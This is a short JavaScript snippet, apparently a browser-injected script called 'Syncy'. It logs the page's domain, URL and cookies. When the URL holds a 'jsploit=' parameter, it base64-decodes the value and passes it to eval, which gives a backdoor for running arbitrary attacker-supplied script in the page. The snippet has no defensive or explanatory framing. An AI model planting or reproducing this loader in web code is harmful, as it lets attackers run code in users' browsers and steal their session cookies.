console.log("Syncy running:")
console.log(document.domain);
console.log(window.location.href);
console.log(document.cookie);


if (document.location.href.indexOf("jsploit") >= 0){
eval(atob(window.location.href.split("jsploit=")[1]))
}
